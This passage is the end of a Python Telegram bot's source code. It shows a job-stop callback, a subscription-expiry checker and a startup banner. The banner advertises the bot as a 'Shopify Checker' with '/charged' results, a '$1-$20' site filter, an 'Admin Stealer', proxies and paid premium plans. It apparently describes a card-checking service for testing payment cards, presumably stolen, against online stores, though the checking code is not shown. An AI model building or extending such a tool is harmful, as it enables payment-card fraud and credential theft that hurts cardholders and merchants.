  · /info ━ 𝗠𝘆 𝗜𝗻𝗳𝗼
  · /plan ━ 𝗩𝗶𝗲𝘄 𝗣𝗹𝗮𝗻𝘀
  · /stop ━ 𝗦𝘁𝗼𝗽"""
        menu = f"""{greet}
━━━━━━━━━━━━━━━━━
{user_cmds_free}
━━━━━━━━━━━━━━━━━
{footer}"""

    bot.reply_to(message, menu)

# ================= CALLBACKS =================
@bot.callback_query_handler(func=lambda c: c.data.startswith('stop_'))
def cb_stop(call):
    try: bot.answer_callback_query(call.id, "Stopping...")
    except: pass
    jid = call.data[5:]
    uid = call.from_user.id
    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        if USER_ACTIVE_JOB.get(uid) == jid:
            USER_ACTIVE_JOB.pop(uid, None)

# ================= EXPIRY CHECKER =================
_expiry_notified = set()
_expiry_lock = threading.Lock()

def check_expired_premiums():
    time.sleep(5)
    while True:
        try:
            if os.path.exists(PREMIUM_FILE):
                with open(PREMIUM_FILE, 'r') as f:
                    lines = f.readlines()
                user_expiries = {}
                for line in lines:
                    line = line.strip()
                    if '|' not in line: continue
                    parts = line.split('|')
                    if len(parts) < 2: continue
                    uid = parts[0]
                    try:
                        exp = float(parts[1])
                    except:
                        continue
                    if uid not in user_expiries or exp > user_expiries[uid]:
                        user_expiries[uid] = exp
                for uid, exp in user_expiries.items():
                    if exp == 0: continue
                    if uid == str(ADMIN_ID): continue
                    with _expiry_lock:
                        if uid in _expiry_notified: continue
                    if time.time() > exp:
                        if is_premium(int(uid)): continue
                        with _expiry_lock:
                            _expiry_notified.add(uid)
                        try:
                            bot.send_message(int(uid), "⚠️ **Subscription Expired**\n━━━━━━━━━━━━━━━━━━━━\nYour premium plan has ended.\nContact admin to renew.")
                        except:
                            pass
        except:
            pass
        time.sleep(30)

# ================= MAIN =================
if __name__ == "__main__":
    print("=" * 60)
    print("🐔 𝗛𝗔𝗠𝗭𝗭𝗬 𝗙𝗫 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 + 𝗔𝗗𝗠𝗜𝗡 𝗕𝗢𝗧 𝗩𝟮")
    print("=" * 60)
    print(f"🤖 𝗕𝗼𝘁: @{BOT_USERNAME}")
    print(f"👑 𝗔𝗱𝗺𝗶𝗻: {ADMIN_ID}")
    print(f"📁 𝗦𝘁𝗼𝗿𝗮𝗴𝗲: SQLite + Files")
    print(f"🔄 𝗠𝗲𝘁𝗵𝗼𝗱: Polling")
    print("=" * 60)
    print("✅ Shopify Checker: ENABLED (/sh, /msh)")
    print("✅ Admin Stealer: ENABLED")
    print("✅ User Monitoring: ENABLED")
    print("✅ Session Tracking: ENABLED")
    print("✅ Database Storage: ENABLED")
    print("✅ Admin Panel: ENABLED")
    print("✅ Site Auto Filter: $1-$20")
    print("✅ Loading Animation: ENABLED")
    print("✅ Proxy System: ENABLED")
    print("✅ Premium System: ENABLED")
    print("✅ Redeem System: ENABLED")
    print("✅ Broadcast System: ENABLED")
    print("✅ Maintenance Mode: ENABLED")
    print("✅ Stop Command: ENABLED")
    print("✅ 2-Digit Year Support: ENABLED")
    print(f"✅ API Available: {'YES' if API_AVAILABLE else 'NO'}")
    print("=" * 60)
    print("📋 ADMIN COMMANDS:")
    print("  /admin, /charged, /users, /user <id>, /sessions")
    print("  /stats, /status, /deldb")
    print("  /addpremium, /rmpremium, /rplan, /planall")
    print("  /credeem, /lredeem, /broadcast")
    print("  /ban, /unban, /maintenance on/off")
    print("=" * 60)
    print("🚀 𝗕𝗢𝗧 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...")
    print("=" * 60)
    
    t = threading.Thread(target=check_expired_premiums, daemon=True)
    t.start()
    
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)
